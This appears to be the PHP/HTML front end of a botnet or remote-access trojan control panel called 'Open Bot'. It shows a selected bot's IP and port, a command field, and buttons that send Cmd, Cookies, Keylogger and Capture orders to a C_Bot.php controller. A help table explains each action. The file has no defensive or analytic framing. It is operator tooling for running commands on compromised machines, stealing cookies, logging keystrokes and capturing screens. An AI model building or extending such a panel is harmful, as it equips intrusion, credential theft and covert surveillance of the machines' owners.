<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <link rel="stylesheet" type="text/css" href="../css/openBot.css" />
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet">
    <script src="https://kit.fontawesome.com/yourcode.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
    <title>Open Bot</title>
</head>

<body>
    <div class="container">
        <div class="inputCommand">
            <div class="header">
                <ul class="ul_header">
                    <li class="li_header label_header">
                        <label for="">Control Bot</label>
                    </li>
                </ul>
                <ul class="ul_header">
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-minus" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-regular fa-square" style="color: black; text-shadow: none"></i>
                    </li>
                    <li class="li_header li_header_icon">
                        <i class="fa-solid fa-x" style="color: black; text-shadow: none"></i>
                    </li>
                </ul>
            </div>
            <div class="content">
                <div class="content-container">
                    <form class="content_form" method="post" action="" ; id="myForm">
                        <div class="content_element">
                            <label class="content_element-label" for="ip">IP:</label>
                            <input class="content_element-input" id="ip" type="text" name="ip" readonly value="<?php echo $bot->getId(); ?>" />
                        </div>
                        <div class="content_element">
                            <label class="content_element-label" for="port">PORT:</label>
                            <input class="content_element-input" id="port" type="text" name="port" readonly value="<?php echo $bot->getPort(); ?>" />
                        </div>
                        <div style="margin-top:20px ;">
                            <label class="content_element-label" style="display: block; text-align:center; margin-bottom: 8px; text-transform: uppercase; font-size:16px;" for="command">Enter command:</label>
                            <input class="content_element-input" id="command" type="text" name="cmdstr" />
                        </div>
                        <!-- <p class="content_element-label" style="width:100%;">Enter command: </p>
                    <input class="content_element-input" type="text" name="cmdstr" > -->
                        <div class="content_button">
                            <p><button class="content_button-el" type="submit" onclick="handleCmd()" name="buttonCmd">Cmd</button></p>
                            <p><button class="content_button-el" type="submit" onclick="handleCookies()" name="buttonCookies">Cookies</button></p>
                            <p><button class="content_button-el" type="submit" onclick="handleKeylogger()" name="buttonKeylogger">Keylogger</button></p>
                            <p><button class="content_button-el" type="submit" onclick="handleCapture()" name="buttonCapture">Capture</button></p>
                        </div>
                    </form>
                    <div class="content_ins">
                        <table class="content_table">
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get cmd</td>
                                <td class="content_table-td">Enter cmd<br> Click Cmd button</td>
                            </tr>
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get cookie</td>
                                <td class="content_table-td">Enter url<br> Click Cookie button</td>
                            </tr>
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get keylogger</td>
                                <td class="content_table-td">Click Cmd button</td>
                            </tr>
                            <tr class="content_table-tr">
                                <td class="content_table-td">Get capture</td>
                                <td class="content_table-td">Click Capture button</td>
                            </tr>
                        </table>
                    </div>
                </div>
                <button class="content_back" onclick="history.back()">Go Back</button>
            </div>
        </div>
        <?php
        include_once("navigate.php");
        ?>
    </div>
    <script>
        function handleCmd() {
            var myForm = document.getElementById("myForm");
            if (myForm) {
                myForm.action = "../Controller/C_Bot.php?ID=<?php echo $bot->getId(); ?>&opt=control&function=cmd";
            }
        }

        function handleCookies() {
            var myForm = document.getElementById("myForm");
            if (myForm) {
                myForm.action = "../Controller/C_Bot.php?ID=<?php echo $bot->getId(); ?>&opt=control&function=cookies";
            }
        }

        function handleKeylogger() {
            var myForm = document.getElementById("myForm");
            if (myForm) {
                myForm.action = "../Controller/C_Bot.php?ID=<?php echo $bot->getId(); ?>&opt=control&function=keylogger";
            }
        }

        function handleCapture() {
            var myForm = document.getElementById("myForm");
            if (myForm) {
                myForm.action = "../Controller/C_Bot.php?ID=<?php echo $bot->getId(); ?>&opt=control&function=capture";
            }
        }
    </script>
</body>

</html>